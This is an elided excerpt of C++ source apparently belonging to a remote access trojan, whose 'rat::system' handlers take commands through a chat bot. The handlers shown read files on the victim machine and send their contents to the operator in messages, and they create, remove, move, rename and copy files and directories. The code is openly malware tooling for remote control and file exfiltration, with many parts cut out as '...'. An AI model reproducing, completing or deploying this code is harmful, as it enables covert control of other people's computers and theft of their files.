			...
			const bool &is_regular_file =
				...
				if(file_exists && is_regular_file) {
						if(std::filesystem::file_size(file_path) > 4 * KB) {
							this->bot->sendMessage(
							    "File too large to be sent as a message, use "
							    "/get instead");
							return;
						}
						try {
							const std::string &buffer =
							    rat::system::readFile(file_path);
					...
					this->bot->sendMessage(fmt::format("Path: {} is not a file",
					                                   file_path.string()));
					return;
				}
				else if(!file_exists) {
...
void Handler::handleTouchCommand() {
	...
	std::string response = "Failed to create";
		for(const auto &param : command.parameters) {
			bool success =
			    rat::system::createFile(std::filesystem::path(param));
		...
		for(const auto &param : command.parameters) {
			const auto path = std::filesystem::path(param);
				if(!std::filesystem::exists(path)) {
					response += fmt::format(
					    "file: {} does not exist, cannot be removed\n",
					    path.string());
					continue;
				}
...
void Handler::handleMvCommand() {
	...
	const auto dist_path = std::filesystem::path(command.parameters[1]);
		...
		if(!std::filesystem::exists(source_path)) {
			this->bot->sendMessage(fmt::format("Source path {} does not exist",
			                                   source_path.string()));
			return;
		}
	...
	std::string result;
		if(rat::system::isFile(source_path)) {
				if(rat::system::isDir(dist_path)) {
						if(rat::system::renameFile(
						       source_path,
						       dist_path / source_path.filename())) {
							result = fmt::format(
							    "File {} moved to {}", source_path.string(),
							    (dist_path / source_path.filename()).string());
						}
						else {
							result = fmt::format("Failed to move file {}",
							                     source_path.string());
						}
				}
				else {
						if(rat::system::renameFile(source_path, dist_path)) {
							result = fmt::format("File {} renamed to {}",
							                     source_path.string(),
							                     dist_path.string());
						}
						else {
							result = fmt::format("Failed to rename file {}",
							                     source_path.string());
						}
				}
		}
				...
				if(rat::system::moveDir(source_path, dist_path)) {
					result =
					    fmt::format("Directory {} moved to {}",
					                source_path.string(), dist_path.string());
				}
				else {
					result = fmt::format("Failed to move directory {}",
					                     source_path.string());
				}
		}
	this->bot->sendMessage(result);
...
void Handler::handleCpCommand() {
	...
	const auto dist_path = std::filesystem::path(command.parameters[1]);
		...
		if(std::filesystem::exists(dist_path)) {
			this->bot->sendMessage(
			    fmt::format("Path {} already exists, overwrite disabled",
			                dist_path.string()));
			return;
		}
	...
	bool result = false;
		if(rat::system::isFile(source_path)) {
				if(rat::system::isFile(dist_path)) {
					...
					result = rat::system::copyFile(
					    source_path, dist_path / source_path.filename());
				}
		}
		else {
		...
		if(result) {
			this->bot->sendMessage(fmt::format("Content of {} copied to {}",
			                                   source_path.string(),
			                                   dist_path.string()));
		}
		else {
			this->bot->sendMessage(fmt::format("Failed to copy {} to {}",
			                                   source_path.string(),
			                                   dist_path.string()));
		}
}
